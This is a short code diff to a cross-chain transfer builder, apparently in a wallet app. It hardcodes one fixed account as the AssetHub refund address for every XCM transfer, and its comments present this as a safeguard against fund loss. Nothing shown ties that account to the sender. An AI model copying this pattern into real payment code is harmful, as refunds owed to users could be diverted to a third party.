@@ -10,6 +10,8 @@ import { toHuman } from '@/utils/transfer'
 
 type TxBuilder = ReturnType<typeof Builder>
 
+const velocityRecoveryAccount = '148FYcbxxTnhTCgiTgyVod5LygZZRQiGn2bQA2YqaaZbb9WJ'
+
 class XcmTransferBuilderManager {
   private static instance: XcmTransferBuilderManager
   private builders: Map<string, TxBuilder>
@@ -52,6 +54,9 @@ class XcmTransferBuilderManager {
         .currency({ ...currencyId, amount: sourceAmount })
         .address(recipient)
         .senderAddress(senderAddress)
+        // AssetHub refund address for multihop transfers (Mythos → Ethereum)
+        // Used when Key20 → ID32 conversion isn't possible, preventing fund loss on failed transfers
+        .ahAddress(velocityRecoveryAccount)
 
       this.builders.set(key, builder)
     } catch (error) {
